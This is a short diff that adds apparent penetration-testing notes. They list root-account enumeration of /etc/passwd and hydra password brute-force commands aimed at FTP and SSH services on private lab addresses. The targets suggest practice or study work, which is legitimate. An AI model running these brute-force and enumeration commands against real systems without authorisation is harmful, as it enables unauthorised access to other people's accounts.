@@ -1,0 +1,8 @@
+grep :0: /etc/passwd
+sort -nk3 -t: /etc/passwd | less
+
+hydra -l user -P passlist.txt ftp://192.168.0.1
+
+hydra -l dev -P /usr/share/wordlists/cybr.txt ssh://172.16.144.137
+
+find / -name " " -print
